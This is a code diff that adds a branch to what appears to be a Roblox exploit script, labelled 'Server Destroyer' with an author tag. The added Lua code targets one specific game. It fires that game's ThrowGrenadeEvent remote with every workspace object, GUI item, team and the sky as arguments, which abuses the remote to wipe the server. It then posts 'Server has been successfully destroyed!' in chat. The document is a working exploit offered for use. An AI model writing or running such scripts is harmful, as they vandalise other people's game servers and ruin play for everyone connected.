@@ -211,4 +211,64 @@ if game.PlaceId == 11698235691 or game.PlaceId == 11940161478 or game.PlaceId ==
       Rejoin()
    end
    end)
+elseif game.PlaceId == 9329726891 then
+   game:GetService("StarterGui"):SetCore("SendNotification",
+   {
+      Title = "Server Destroyer",
+      Text = "Loaded! Made by Gerashino#8015",
+      Duration = 3
+   }
+   )
+   local properties = {
+      Color = Color3.new(12, 255, 0);
+      Font = Enum.Font.FredokaOne;
+      TextSize = 16;
+   }
+   properties.Text = "Server Destroyer. Made by Gerashino#8015"
+   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
+   properties.Text = "Destroying Server..."
+   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
+   wait(1)
+   for _,w in pairs(workspace:GetChildren()) do
+      local destroy = {
+          [1] = w,
+          [2] = 0,
+          [3] = 0,
+          [4] = 0
+      }
+
+      game:GetService("Lighting").ThrowGrenadeEvent:FireServer(unpack(destroy))
+   end
+   for _,g in pairs(game.StarterGui:GetChildren()) do
+      local destroy = {
+          [1] = g,
+          [2] = 0,
+          [3] = 0,
+          [4] = 0
+      }
+
+      game:GetService("Lighting").ThrowGrenadeEvent:FireServer(unpack(destroy))
+   end
+   for _,t in pairs(game.Teams:GetChildren()) do
+      local destroy = {
+          [1] = t,
+          [2] = 0,
+          [3] = 0,
+          [4] = 0
+      }
+
+      game:GetService("Lighting").ThrowGrenadeEvent:FireServer(unpack(destroy))
+   end
+
+   local destroy = {
+       [1] = game.Lighting.Sky,
+       [2] = 0,
+       [3] = 0,
+       [4] = 0
+   }
+
+   game:GetService("Lighting").ThrowGrenadeEvent:FireServer(unpack(destroy))
+
+   properties.Text = "Server has been successfully destroyed!"
+   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
 end
